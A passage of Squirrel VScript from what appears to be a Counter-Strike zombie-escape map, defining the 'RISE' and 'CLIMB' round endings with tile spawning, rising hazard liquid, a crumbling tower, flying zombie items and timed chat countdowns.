						eposdirleft = Vector()+::AnglesToDir(::DirToAngles(eposdir)+Vector(0,90,0));
						local randyaw = [0,90,180,270];
						local man = ::manager.GetScriptScope();
						local spawnlist = [//+x:forward, +y:left
							{x = 0.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5		targetname="ending_rise_blocks_start"},
							{x = 0.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5		targetname="ending_rise_blocks_start"},
							{x = 1.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 1.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 2.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 2.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 3.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 3.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 4.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 4.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 5.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 5.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 6.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 6.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
						];
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*(s.x*man.GRID_SIZE))+
								(eposdirleft*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.elevation*man.ELEVATION);
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_rise_ending"};
							if("targetname" in s)sq.targetname <- s.targetname;
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(spawndata);
						}
						epos += (eposdir*(man.GRID_SIZE*6));
						local dirchecks = [];
						if(man.current_dir=="east")dirchecks = ["east","north","south"];
						else if(man.current_dir=="west")dirchecks = ["west","north","south"];
						else if(man.current_dir=="north")dirchecks = ["east","west","north"];
						else if(man.current_dir=="south")dirchecks = ["east","west","south"];
						dirchecks = ::ScrambleArray(dirchecks);
						foreach(dir in dirchecks)
						{
							local newpd = Vector();
							local newpdpos = Vector()+epos;
							if(dir=="east")newpd = Vector(1,0,0);
							else if(dir=="west")newpd = Vector(-1,0,0);
							else if(dir=="north")newpd = Vector(0,1,0);
							else if(dir=="south")newpd = Vector(0,-1,0);
							local allowed = false;
							if(dir=="east" && (newpdpos+(newpd*12000)).x < 15500)allowed=true;
							else if(dir=="west" && (newpdpos+(newpd*12000)).x > -15500)allowed=true;
							else if(dir=="north" && (newpdpos+(newpd*12000)).y < 15500)allowed=true;
							else if(dir=="south" && (newpdpos+(newpd*12000)).y > -15500)allowed=true;
							if(allowed)
							{
								man.current_dir = ""+dir;
								eposdir = Vector()+newpd;
								break;
							}
						}
						epos += (eposdir*(man.GRID_SIZE));
						eposdirleft = Vector()+::AnglesToDir(::DirToAngles(eposdir)+Vector(0,90,0));
						
						
						//__CSS__ threading_disabled
						//EntFire("manager","RunScriptCode","newthread(::ENDINGS.RISE.RunPost.bindenv(::ENDINGS.RISE)).call();",0.50,null);
						//EntFire("manager","RunScriptCode","newthread(::ENDINGS.RISE.RunCollapse.bindenv(::ENDINGS.RISE)).call();",collapse_delay,null);
						EntFire("manager","RunScriptCode","::ENDINGS.RISE.RunPost();",0.50,null);
						EntFire("manager","RunScriptCode","::ENDINGS.RISE.RunCollapse();",collapse_delay,null);
						
						
					},function RunPost(){
						local man = ::manager.GetScriptScope();
						local forward_yaw = ::DirToAngles(eposdir).y;
						local randyaw = [0,90,180,270];
						local spawnlist = [//+x:forward, +y:left
							{x = 0.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5		targetname="ending_rise_blocks_start"},
							{x = 1.00,		y = 0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 0.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5		targetname="ending_rise_blocks_start"},
							{x = 1.00,		y = -0.50,		elevation = 0.00,		yaw = null,		index = 5,		targetname="ending_rise_blocks_start"},
							{x = 1.00,		y = 0.00,		elevation = zplat_height,		yaw = null,		index = 25,		targetname="ending_rise_tpfloor"},
						];
						local z = 0.00;
						for(local x=2;x<hill_length;x++)
						{
							local climb = false;
							local climb_ladder = 1;		//(1:ladder)(2:climbhard)(3:climb)
							for(local cs=0;cs<climbsections.len();cs+=2)
							{
								if(x==climbsections[cs])
								{
									climb = true;
									climb_ladder = climbsections[cs+1];
									break;
								}
							}
							for(local y = -hill_width;y<hill_width;y++)
							{
								spawnlist.push({x=x,	y=y+0.50,	elevation=z,	yaw=forward_yaw+180,	index=5		targetname="ending_rise_blocks",	type="slope"});
							}
							if(climb)
							{
								z += climbheight;
								for(local ca=0;ca<climbamount;ca++)
								{
									if(climb_ladder==1)
									{
										spawnlist.push({x=x+RandomFloat(-0.02,0.00), y=RandomFloat(-2.50,2.50), elevation=z-20+(RandomFloat(-0.05,0.00)),
										yaw=forward_yaw+180, index=3	targetname="ending_rise_climbblocks"});
									}
									else
									{
										local iiidddxxx = 4;
										if(climb_ladder==3)iiidddxxx = 141;
										spawnlist.push({x=x+RandomFloat(-0.01,0.05), y=RandomFloat(-2.50,2.50), elevation=z-20+(RandomFloat(-0.05,0.02)),
										yaw=forward_yaw+180, index=iiidddxxx	targetname="ending_rise_climbblocks"});
									}
								}	
							}
							else z += 1.00;
						}
						for(local x=(0+hill_length);x<(hill_length+top_length);x++)
						{
							for(local y = -hill_width;y<hill_width;y++)
							{
								spawnlist.push({x=x,	y=y+0.50,	elevation=z,	yaw=null,	index=5		targetname="ending_rise_blocks_top",	type="main"});
							}
						}
						z += 1.00;
						spawnlist.push({x=(hill_length+top_length+0.00), y=0, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+1.00), y=0, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+2.00), y=0, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+0.00), y=1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+1.00), y=1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+2.00), y=1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+0.00), y=-1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+1.00), y=-1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						spawnlist.push({x=(hill_length+top_length+2.00), y=-1, elevation=z, yaw=null, index=25, targetname="ending_rise_endblocks"});
						local tppos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*(1.00*man.GRID_SIZE))+
								(eposdirleft*(0.00*man.GRID_SIZE))+
								Vector(0,0,(man.ELEVATION*zplat_height)+zplat_tpoffset);
						::TPmovequeue.push(tppos);
						::TPmovequeue.push(::DirToAngles(eposdir));
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay,null);
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay+0.05,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								if(winner==3)
								{
									::ServerSay("say [RISE ENDING] YOU WON!",0.00,null);
									::ServerSay("say [RISE ENDING] YOU WON!",0.01,null);
									::ServerSay("say [RISE ENDING] YOU WON!",0.02,null);
									printl("[RISE ENDING] YOU WON!");
									::RoundWon();
								}
								else
								{
									::ServerSay("say [RISE ENDING] YOU LOST!",0.00,null);
									::ServerSay("say [RISE ENDING] YOU LOST!",0.01,null);
									::ServerSay("say [RISE ENDING] YOU LOST!",0.02,null);
								}
							}});
						local pqd = [];
						pqd.push({qrate=process_full_delay,function Run(){}});
						local amount = 0;
						foreach(s in spawnlist)
						{
							local type = "main";
							if("type" in s)type = s.type;
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME][type][RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME][type].len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*(s.x*man.GRID_SIZE))+
								(eposdirleft*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.elevation*man.ELEVATION);
							if(s.index==3)//LADDER
							{
								::ladder_spawnqueue.push({targetname="ending_rise_climbblocks"});
								::ladderspawnqueuespawn.push({pos=spawndata.pos,rot=Vector(0,spawndata.yaw+180,0)});
							}
							else if(s.index==2)//START_END
								model = ::TILEVARIANTS[::TYPES[5].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[5].name][::THEME].main.len()-1)];
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_rise_ending"};
							if("targetname" in s)sq.targetname <- s.targetname;
							if(amount > process_full_startlimit)
							{
								pqd.push({
									sq = sq,
									spawndata = spawndata,
									function Run(){
										::SpawnQueue.push(sq);
										::SpawnQueueSpawner.push(spawndata);
									}});
							}
							else
							{
								::SpawnQueue.push(sq);
								::SpawnQueueSpawner.push(spawndata);
							}
							amount++;
						}
						::Process(pqd,0.00);
						local tpmover_start = epos+(eposdir*(1*man.GRID_SIZE))+Vector(0,0,(zplat_height)*man.ELEVATION);
						local tpmover_target = epos+(eposdir*((hill_length*man.GRID_SIZE)+zplat_targetofs_side))+Vector(0,0,((z+zplat_height)*man.ELEVATION)+zplat_targetofs_height);
						local tpmover_dist = ::GetDistance(tpmover_start,tpmover_target);
						local tpmover_dir = (tpmover_target-tpmover_start);
						tpmover_dir.Norm();
						tpmover_dir = ::DirToAngles(tpmover_dir);
						tpmover_dir = ""+tpmover_dir.x.tostring()+" "+tpmover_dir.y.tostring()+" "+tpmover_dir.z.tostring();
						::Ent(epos+(eposdir*(man.GRID_SIZE*1.5))+Vector(0,0,zplat_height*man.ELEVATION),Vector(),"func_movelinear",{
								targetname = "ending_rise_tpmover",
								movedir = tpmover_dir,
								movedistance = tpmover_dist,
								blockdamage = 999999,
								speed = ::ENDINGS.RISE.zplat_speed,
								spawnflags = 8,
							},{
							function TickTpDest(){
								EntFireByHandle(self,"RunScriptCode","TickTpDest();",0.01,null,null);
								::tpdest.SetOrigin(self.GetOrigin()+Vector(0,0,::ENDINGS.RISE.zplat_tpoffset));
							},function RunPost(){
								EntFire("ending_rise_tpfloor","SetParent","!activator",0.00,self);
								EntFireByHandle(self,"Open","",::ENDINGS.RISE.zplat_move_delay+0.10,self,null);
							},function Run(){
								EntFireByHandle(self,"RunScriptCode","RunPost();",2.00,null,null);
								EntFireByHandle(self,"RunScriptCode","TickTpDest();",::ENDINGS.RISE.zplat_move_delay+2.00,null,null);
							}});
						local hazliq_movedist = (0+(man.ELEVATION*z)-(hazliquid_spawnoffset+hazliquid_targetlip));
						//::manager.PrecacheModel("models/luffaren/rise_ending_hazliquid.mdl");
						::Ent(epos+Vector(0,0,hazliquid_spawnoffset),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
								model="models/luffaren/rise_ending_hazliquid.mdl",
								modelscale = 2.00,
								rendermode = 1,
								renderamt = 0,
								rendercolor = "255 255 255 0",
								targetname = "rising_hazliquid",
							},{
							sounds = [],
							hazliq_movedist = hazliq_movedist,
							function Run(){
								local ii = 0.00;
								for(local alpha=0;alpha<255;alpha+=1)
								{
									EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
									ii += 0.01;
								}
								EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
								EntFireByHandle(self,"AddOutput","skin "+::THEMES[::THEME].hazliquid_skin.tostring(),0.00,null,null);
								::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
										spawnflags = 1,
										targetname = "rising_hazliquid_hurt",
									},{
									model = self,
									function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										if(toucher.GetTeam()==3)
											EntFireByHandle(toucher,"SetHealth","-1",0.00,null,null);
										else if(toucher.GetTeam()==2)
										{
											toucher.SetOrigin(Vector(0,0,-16160));
											toucher.SetVelocity(Vector());
										}
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										EntFireByHandle(self,"AddOutput","mins -20000 -20000 -16",0.00,null,null);
										EntFireByHandle(self,"AddOutput","maxs 20000 20000 0",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
										EntFireByHandle(self,"Enable","",0.10,null,null);
									}});
								::Ent(self.GetOrigin()+Vector(0,0,-2),self.GetAngles(),"prop_dynamic",{
										model="models/luffaren/rise_ending_hazliquid.mdl",
										modelscale = 2.00,
										rendermode = 3,
										renderamt = 0,
										rendercolor = "255 255 255 0",
										targetname = "rising_hazliquid",
									},{
									master = self,
									function Run(){
										local ii = 0.00;
										for(local alpha=0;alpha<255;alpha+=1)
										{
											EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
											ii += 0.01;
										}
										EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
										EntFireByHandle(self,"AddOutput","skin "+::THEMES[::THEME].hazliquid_skin.tostring(),0.00,null,null);
										EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
								}});
								::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
										targetname = "rising_hazliquid_mover",
										movedir = "-90 0 0",
										movedistance = hazliq_movedist,
										blockdamage = 999999,
										speed = ::ENDINGS.RISE.hazliquid_speed,
										spawnflags = 8,
									},{
									master = self,
									function RunPost(){
										EntFireByHandle(master,"SetParent","!activator",0.00,self,null);
										EntFireByHandle(self,"Open","",::ENDINGS.RISE.hazliquid_move_delay+0.10,self,null);
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","RunPost();",0.50,null,null);
									}});
						}});
					}},
				CLIMB={	cancel_mapspawn=true,		movetp_clean=true,
						force_precipitation = 1,			//null:ignore	0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
						force_precipitation_delay = 8.80,	//how long to force precipitation if not null^
						tower_extra_bottomlayers = 3,		//set to 0 to spawn none, else it spawns X extra layers below (making it look taller)
						debris_fall_delay = 35.00,			//after this time, start spawning falling debris (like in finale)
						debris_fall_damage = 3,				//how much damage the falling debris should deal to players on-touch (override)
						crumble_time = 113.00,				//start crumbling the tower at this point (enable spawnkiller WITHOUT slaying 'flight' here)
						flight_slay_time = 140.50,			//when to manually slay all 'flight' items
						delay_slay_time = 200.00,			//when to slay everyone in the map no matter what (probably a loss if it reaches this point..)
						boost_enable_delay = 8.80,			//how long to wait before enabling the start-boost
						tp_timer = 30.20,					//when to start fading out the old stage/moving the TP to the ending-arena shortly after
						flight_zcap = 200,					//if flight-user is this far below the start-point (z-pos-wise): reset position to far distance again
						flight_spawndelay = 36.00,			//how long to wait before spawning zombie 'flight' items
						flight_amount = -5,					//how many Z-flight-items to spawn (>0:limited amount)(0:none)(<0:abs-amount but spawns a new on-pickup *infinite*)
						flight_init_distance = 12000,		//how far away from the tower to TP the flight-item
						flight_init_distance_z = 4000,		//Z-height offset (relative to the tower) to TP the flight-item to
						flight_init_randofs = 1000,			//the XYZ random-offset for setting the TP for flight-items
						flight_init_startvel = 500,			//the starting-velocity towards the tower just after getting TP'd on-flight-pickup
						flight_description_override = ""+	//the flight-item-description to override during the event (makes it less confusing for zombies)
							"You are an angel\nFly by looking around and using WASD\n(you have slow momentum)\n\nNow go!\nKill the humans climbing the tower",
					ending_started = false,					//internal/read-only value, sets to 'true' via 'SpawnFlightItemInit()' (delayed a bit from Run())
					towercenter = Vector(),
					startpos = Vector(),
					startdir = Vector(),
					startdirleft = Vector(),
					crumble_pieces = [],
					angelcount = 0,
					tplimit_z = 0,
					function SpawnFlightItemInit(){
						::ENDINGS.CLIMB.ending_started = true;
						::ITEMS.flight.description = ("\n"+::ENDINGS.CLIMB.flight_description_override);
						if(flight_amount!=0)
						{
							local spawnamount = (0+abs(flight_amount));
							for(local i=0;i<spawnamount;i++){SpawnFlightItem();}
						}
					},function SpawnFlightItem(){
						local dir = Vector()+startdirleft;
						if(RandomInt(1,2)==1)dir *= -1;
						local spos = startpos+(dir*RandomFloat(70,230))+(startdir*(RandomFloat(-45,45)));
						::ITEMS.flight.Spawn(spos+Vector(0,0,40));
					},function FlightMoveUser(user){
						local mdir = Vector()-towercenter;
						mdir.z = 0.00;
						mdir.Norm();
						local mpos = towercenter+(mdir*flight_init_distance)+
							Vector(	RandomFloat(-flight_init_randofs,flight_init_randofs),
									RandomFloat(-flight_init_randofs,flight_init_randofs),
									RandomFloat(-flight_init_randofs,flight_init_randofs)+flight_init_distance_z);
						if(mpos.x < -16000)mpos.x = -16000;
						else if(mpos.x > 16000)mpos.x = 16000;
						if(mpos.y < -16000)mpos.y = -16000;
						else if(mpos.y > 16000)mpos.y = 16000;
						if(mpos.z < -16000)mpos.z = -16000;
						else if(mpos.z > 16000)mpos.z = 16000;
						user.SetOrigin(mpos);
						mdir *= -1;
						user.SetForwardVector(mdir);
						user.ValidateScriptScope();
						user.GetScriptScope().climbending_flightvel <- (mdir*flight_init_startvel);
						EntFireByHandle(user,"RunScriptCode","self.SetVelocity(climbending_flightvel);delete climbending_flightvel;",0.10,null,null);
					},function FlightEnabled(user){
						if(flight_amount < 0)SpawnFlightItem();
						FlightMoveUser(user);
						if("angel_marked" in user.GetScriptScope())return;
						user.GetScriptScope().angel_marked <- true;
						angelcount++;
						local angels = " angels are approaching";
						if(angelcount==1)angels = " angel is approaching";
						::ServerSay("say [CLIMB ENDING] "+angelcount.tostring()+angels,0.00,null);
					},function TickCrumble(){
						EntFire("manager","RunScriptCode"," ::ENDINGS.CLIMB.TickCrumble(); ",0.10,null);
						if(crumble_pieces.len()<=0)return;
						local piece = crumble_pieces[0];
						crumble_pieces.remove(0);
						
						
						::CollapseTile(piece,function(hh){
							hh.AcceptInput("DisableMotion","",null,null);
							EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(hh,"EnableMotion","",0.02,null,null);
							EntFireByHandle(hh,"Kill","",2.00,null,null);
						});
						//EntFireByHandle(piece,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						//EntFireByHandle(piece,"EnableMotion","",0.02,null,null);
						//EntFireByHandle(piece,"Kill","",2.00,null,null);
						
						
					},function StartCrumble(){
						EntFire("manager","RunScriptCode"," EnableSpawnKiller(false); ",0.00,null);
						::ServerSay("say [CLIMB ENDING] RESPAWN IS DISABLED",0.20,null);
						::ServerSay("say [CLIMB ENDING] RESPAWN IS DISABLED",0.21,null);
						::ServerSay("say [CLIMB ENDING] RESPAWN IS DISABLED",0.22,null);
						EntFire("manager","RunScriptCode"," ::ENDINGS.CLIMB.TickCrumble(); ",0.10,null);
						
						
						for(local xh;xh=Entities.FindByName(xh,"ending_endladder_climb");){
							::CollapseTile(xh,function(hh){
								hh.AcceptInput("DisableMotion","",null,null);
								EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								EntFireByHandle(hh,"EnableMotion","",0.02,null,null);
								EntFireByHandle(hh,"Kill","",3.00,null,null);
							});
						}
						//EntFire("ending_endladder_climb","RunScriptCode","self.SetCollisionGroup(10);",0.00,null);
						//EntFire("ending_endladder_climb","EnableMotion","",0.02,null);
						//EntFire("ending_endladder_climb","Kill","",3.00,null);
						
						
						
						EntFire("ending_startboost_climb*","Kill","",0.00,null);
						for(local h;h=Entities.FindByName(h,"ending_climb*");){crumble_pieces.push(h);}
						crumble_pieces = ::ScrambleArray(crumble_pieces);
					},function Run(){
						::delay_check_enabled = false;
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner==3)
								{
									::ServerSay("say [CLIMB ENDING] YOU WON!",0.00,null);
									printl("[CLIMB ENDING] YOU WON!");
									::RoundWon();
								}
								else
									::ServerSay("say [CLIMB ENDING] YOU LOST!",0.00,null);
							}});
						if(::ENABLE_ENDING_MUSIC){::Sound("#music/luffaren_collective/sins_father.mp3",Vector(),null,0,200.00,100,10);}
						::manager.GetScriptScope().finalerubble_touchdamage = (0+debris_fall_damage);
						EntFire("manager","RunScriptCode"," finalerubble_ticking++; ",debris_fall_delay,null);
						EntFire("manager","RunScriptCode"," finalerubble_ticking--; ",flight_slay_time,null);
						EntFire("manager","RunScriptCode"," EnableSpawnKiller(true); ",flight_slay_time,null);
						EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",delay_slay_time,null);
						EntFire("manager","RunScriptCode","::ENDINGS.CLIMB.SpawnFlightItemInit();",flight_spawndelay,null);
						if(force_precipitation!=null)
							EntFire("manager","RunScriptCode","SetPrecipitation("+force_precipitation.tostring()+");",force_precipitation_delay,null);
						local man = ::manager.GetScriptScope();
						local md = ::MAPDATA[man.mapspawnindex-1];
						local direction_next_left = ::AnglesToDir(::DirToAngles(md.direction_next)+Vector(0,90,0));
						local forward_yaw = ::DirToAngles(md.direction_next).y;
						local randyaw = [0,90,180,270];
						local sideofs = -4.5;
						local opening_crouch = 57;
						local opening_stand = 149;
						local tppos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
								//(md.direction_next*(1.00*man.GRID_SIZE))+
								//(direction_next_left*(0.00*man.GRID_SIZE))+
								Vector(0,0,8);
						::TPmovequeue.push(tppos);
						::TPmovequeue.push(::DirToAngles(md.direction_next));
						startpos = Vector()+tppos;
						startdir = Vector()+md.direction_next;
						startdirleft = Vector()+direction_next_left;
						tplimit_z = (tppos.z - flight_zcap);
						towercenter = Vector()+startpos+(startdir*(18.5*man.GRID_SIZE));
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_timer,null);
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_timer+0.05,null);
						EntFire("manager","RunScriptCode"," ::ENDINGS.CLIMB.StartCrumble(); ",crumble_time,null);
						::ServerSay("say [CLIMB ENDING] WE MUST CLIMB THE TOWER",0.00,null);
						::ServerSay("say [CLIMB ENDING] WE MUST CLIMB THE TOWER",0.01,null);
						::ServerSay("say [CLIMB ENDING] WE MUST CLIMB THE TOWER",0.02,null);
						::ServerSay("say [CLIMB ENDING] ONLY THE VERY TOP WILL BE SAFE",1.03,null);
						::ServerSay("say [CLIMB ENDING] ONLY THE VERY TOP WILL BE SAFE",1.04,null);
						::ServerSay("say [CLIMB ENDING] ONLY THE VERY TOP WILL BE SAFE",1.05,null);
						::ServerSay("say [CLIMB ENDING] NOW GO!",boost_enable_delay+0.00,null);
						::ServerSay("say [CLIMB ENDING] NOW GO!",boost_enable_delay+0.01,null);
						::ServerSay("say [CLIMB ENDING] NOW GO!",boost_enable_delay+0.02,null);
						local ii = (0.00+crumble_time-(crumble_time-13.00));
						if(ii>0.00 && ii < crumble_time)
						{
							::ServerSay("say [CLIMB ENDING] SURVIVE FOR "+(0.00+crumble_time-13.00).tointeger().tostring()+"s",13.00,null);
							::ServerSay("say [CLIMB ENDING] SURVIVE FOR "+(0.00+crumble_time-13.00).tointeger().tostring()+"s",13.01,null);
							::ServerSay("say [CLIMB ENDING] SURVIVE FOR "+(0.00+crumble_time-13.00).tointeger().tostring()+"s",13.02,null);
						}
						ii=(0.00+crumble_time-80.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 80s",ii,null);
						ii=(0.00+crumble_time-60.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 60s",ii,null);
						ii=(0.00+crumble_time-30.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 30s",ii,null);
						ii=(0.00+crumble_time-10.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 10s",ii,null);
						ii=(0.00+crumble_time-5.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 5s",ii,null);
						ii=(0.00+crumble_time-4.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 4s",ii,null);
						ii=(0.00+crumble_time-3.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 3s",ii,null);
						ii=(0.00+crumble_time-2.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 2s",ii,null);
						ii=(0.00+crumble_time-1.00);if(ii>0.00)
							::ServerSay("say [CLIMB ENDING] THE TOWER WILL CRUMBLE IN 1s",ii,null);
						::ServerSay("say [CLIMB ENDING] THE TOWER IS STARTING TO CRUMBLE",crumble_time,null);
						ii=(0.00+flight_slay_time-30.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 30s",ii,null);
						ii=(0.00+flight_slay_time-20.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 20s",ii,null);
						ii=(0.00+flight_slay_time-10.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 10s",ii,null);
						ii=(0.00+flight_slay_time-5.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 5s",ii,null);
						ii=(0.00+flight_slay_time-4.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 4s",ii,null);
						ii=(0.00+flight_slay_time-3.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 3s",ii,null);
						ii=(0.00+flight_slay_time-2.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 2s",ii,null);
						ii=(0.00+flight_slay_time-1.00);if(ii>0.00)::ServerSay("say [CLIMB ENDING] THE ANGELS WILL DIE IN 1s",ii,null);
						::ServerSay("say [CLIMB ENDING] THE ANGELS ARE DEAD",flight_slay_time,null);
						local inviswall_pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
							(md.direction_next*(10.5*man.GRID_SIZE))+
							(direction_next_left*((0)*man.GRID_SIZE))+
							Vector(0,0,8*man.ELEVATION);
						local spawnlist = [//+x:forward, +y:left, +z:up(elevation)		OPTIONAL PARAM:targetname="",
							//{x = 0,			y = 1,			z = -10.00,			yaw = null,			index = 5},
									//start boostpad floor:
								{x = 1.00,			y = 0.0,				z = 0.00,			yaw = null,			index = 5,			targetname="ending_climb_startblock"},
									//ladders:
								{x = 22,			y = 0.0,		z = 15.00,			yaw = forward_yaw+0,			index = 3,			targetname="ending_climb_ladder"},
								{x = 21,			y = 0.0,		z = 45.00,			yaw = forward_yaw+0,			index = 3,			targetname="ending_climb_ladder"},
								{x = 20,			y = 0.0,		z = 75.00,			yaw = forward_yaw+0,			index = 3,			targetname="ending_climb_ladder"},
								{x = 19.5,			y = 0.0,		z = 115.00,			yaw = forward_yaw+0,			index = 3,			targetname="ending_endladder_climb"},
								{x = 17.5,			y = 0.0,		z = 115.00,			yaw = forward_yaw+180,			index = 3,			targetname="ending_endladder_climb"},
								{x = 18.5,			y = 1.0,		z = 115.00,			yaw = forward_yaw+90,			index = 3,			targetname="ending_endladder_climb"},
								{x = 18.5,			y = -1.0,		z = 115.00,			yaw = forward_yaw+270,			index = 3,			targetname="ending_endladder_climb"},
									//climb platforms:
								{x = 21.7,		y = 0.8,		z = 32.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 21.7,		y = -0.8,		z = 32.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 21.7,		y = 3.0,		z = 34.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 21.7,		y = -3.0,		z = 34.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 19.8,		y = 3.3,		z = 36.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 19.8,		y = -3.3,		z = 36.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 17.6,		y = 3.3,		z = 38.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
